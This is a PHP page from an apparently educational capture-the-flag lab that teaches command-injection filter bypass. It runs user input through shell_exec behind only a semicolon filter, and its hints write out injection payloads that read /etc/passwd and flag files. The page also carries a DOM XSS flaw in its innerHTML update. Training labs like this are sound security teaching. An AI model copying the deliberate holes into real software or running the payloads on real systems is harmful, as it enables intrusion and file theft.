<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 2 - Basic Filter Bypass</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Level 2 - Basic Filter Bypass</h1>
            <p><strong>Objective:</strong> Bypass basic character filtering để thực hiện command injection</p>
        </div>

        <div class="form-container">
            <h3>🔍 System Status Checker:</h3>
            <p>Công cụ này kiểm tra status của system services. <strong>Security:</strong> Some dangerous characters are blocked!</p>
            
            <div class="code-block">Command: systemctl status <?php echo htmlspecialchars($_GET['service'] ?? '[SERVICE]'); ?></div>
            
            <?php
            if (isset($_GET['service'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $service = $_GET['service'];
                
                // Basic security filter - block semicolon
                if (strpos($service, ';') !== false) {
                    echo '<div class="error">❌ Security Alert: Semicolon (;) is not allowed!</div>';
                } else {
                    $command = "systemctl status " . $service . " 2>/dev/null || echo 'Service not found'";
                    $output = shell_exec($command);
                    
                    if ($output) {
                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
                    } else {
                        echo 'No output or command failed';
                    }
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="service">Service Name:</label>
                    <input type="text" id="service" name="service" value="<?php echo htmlspecialchars($_GET['service'] ?? ''); ?>" placeholder="Enter service name (e.g., apache2)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Check Service</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>� Active Security Filter</h3>
                <p><strong>Blocked Characters:</strong> Semicolon (;) is filtered</p>
                <p><strong>Challenge:</strong> Execute commands without using semicolon</p>
                <p><strong>Filter Code:</strong> <code>if (strpos($service, ';') !== false)</code></p>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🔄 Alternative Command Operators</h3>
                <ul>
                    <li><strong>&&</strong> - Conditional execution (AND logic)</li>
                    <li><strong>||</strong> - Conditional execution (OR logic)</li>
                    <li><strong>|</strong> - Pipe output to next command</li>
                    <li><strong>&</strong> - Background execution</li>
                    <li><strong>`command`</strong> - Command substitution</li>
                    <li><strong>$(command)</strong> - Command substitution (modern)</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding the Filter</h4>
                    <p><strong>Current Command:</strong> <code>systemctl status [YOUR_INPUT]</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>apache2</code> (should work)</p>
                    <p>🚫 <strong>Test blocked:</strong> <code>apache2; whoami</code> (semicolon blocked)</p>
                    <p>🎯 <strong>Challenge:</strong> Execute commands without semicolon</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: AND Operator (&&)</h4>
                    <p><strong>Concept:</strong> && executes second command only if first succeeds</p>
                    <p>📝 <strong>Test:</strong> <code>apache2 && whoami</code></p>
                    <p>🎯 <strong>How it works:</strong> If systemctl succeeds, whoami runs</p>
                    <p><strong>More examples:</strong></p>
                    <p>• <code>apache2 && id</code></p>
                    <p>• <code>apache2 && pwd</code></p>
                    <p>• <code>apache2 && ls -la</code></p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: OR Operator (||)</h4>
                    <p><strong>Concept:</strong> || executes second command only if first fails</p>
                    <p>📝 <strong>Test:</strong> <code>nonexistent || whoami</code></p>
                    <p>🎯 <strong>Result:</strong> Since service doesn't exist, whoami executes</p>
                    <p><strong>Useful patterns:</strong></p>
                    <p>• <code>fake_service || cat /etc/passwd</code></p>
                    <p>• <code>invalid || ls /var/www</code></p>
                    <p>• <code>notfound || id</code></p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Pipe Operator (|)</h4>
                    <p><strong>Concept:</strong> | sends output of first command to second</p>
                    <p>📝 <strong>Test:</strong> <code>apache2 | cat /etc/passwd</code></p>
                    <p>🎯 <strong>Creative use:</strong> Ignore first command output</p>
                    <p><strong>Examples:</strong></p>
                    <p>• <code>anything | whoami</code></p>
                    <p>• <code>test | ls -la /var/www</code></p>
                    <p>• <code>dummy | cat /var/www/secret_flag.txt</code></p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Command Substitution</h4>
                    <p><strong>Concept:</strong> Execute commands within other commands</p>
                    <p>📝 <strong>Backticks:</strong> <code>apache2 `whoami`</code></p>
                    <p>📝 <strong>Modern syntax:</strong> <code>apache2 $(whoami)</code></p>
                    <p><strong>Creative examples:</strong></p>
                    <p>• <code>$(cat /var/www/secret_flag.txt)</code></p>
                    <p>• <code>`ls /var/www`</code></p>
                    <p>• <code>test $(echo && cat /var/www/secret_flag.txt)</code></p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 6: Find the Flag!</h4>
                    <p><strong>🚀 Target flag location:</strong> <code>/var/flags/level2_hint.txt</code></p>
                    <p><strong>Method 1 (AND):</strong> <code>apache2 && cat /var/flags/level2_hint.txt</code></p>
                    <p><strong>Method 2 (OR):</strong> <code>fake_service || cat /var/flags/level2_hint.txt</code></p>
                    <p><strong>Method 3 (Pipe):</strong> <code>anything | cat /var/flags/level2_hint.txt</code></p>
                    <p><strong>Method 4 (Substitution):</strong> <code>$(cat /var/flags/level2_hint.txt)</code></p>
                    <p><strong>💡 Pro tip:</strong> Try different operators to understand their behavior!</p>
                    <p><strong>🔍 Exploration:</strong> <code>test || find /var/flags -name "*level2*"</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level1.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level3.php">➡️ Next Level</a>
            <a href="submit.php?level=2">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 6;

    function updateCommand() {
        const input = document.getElementById('service').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'Command: systemctl status ' + (input || '[SERVICE]');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>
